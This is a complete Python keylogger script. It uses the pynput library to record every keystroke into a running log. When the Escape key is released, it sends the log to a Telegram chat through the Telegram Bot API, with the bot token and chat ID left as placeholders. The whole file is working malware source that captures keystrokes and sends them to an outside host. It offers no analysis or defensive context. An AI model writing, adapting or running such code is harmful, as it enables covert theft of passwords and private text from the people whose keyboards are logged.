```python
import requests
from pynput import keyboard

BOT_TOKEN = "TELEGRAM BOT API TOKEN"
CHAT_ID = "CHATID"

log = ""

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    requests.post(url, data=payload)

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += f" [{key.name}] "

def on_release(key):
    if key == keyboard.Key.esc:
        send_telegram_message("Keylogger stopped. Logged keys:")
        send_telegram_message(log)
        print("Logging stopped and sent to Telegram.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
